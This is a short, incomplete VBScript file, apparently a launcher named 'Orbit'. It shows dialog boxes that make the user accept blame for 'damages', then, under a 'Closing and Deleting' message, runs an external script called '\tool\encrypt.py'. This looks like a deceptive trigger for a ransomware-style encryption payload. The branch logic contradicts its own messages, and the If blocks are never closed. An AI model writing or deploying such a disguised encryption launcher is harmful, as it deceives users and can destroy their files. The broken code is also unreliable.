Dim answer As Integer
DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )
Set FSO = CreateObject("Scripting.FileSystemObject")

answer = MsgBox("Are u responsible for your actions?", vbQuestion + vbYesNo + vbDefaultButton2, "Orbit")

If answer = vbYes Then
  MsgBox "ok... please wait"
  WScript.sleep(5)
  a=MsgBox("Now running... please wait ", 0+64 ,"Orbit")
  
  answer = MsgBox("You sure you wanna run this script??? Its your fault for any damages.", vbQuestion + vbYesNo + vbDefaultButton2, "Orbit")
  If answer = vbNo Then
    MsgBox "running"
    WScript.sleep(556)

Else
    MsgBox "Closing and Deleting"
    CreateObject("Wscript.shell").Run """\tool\encrypt.py""", 1, True
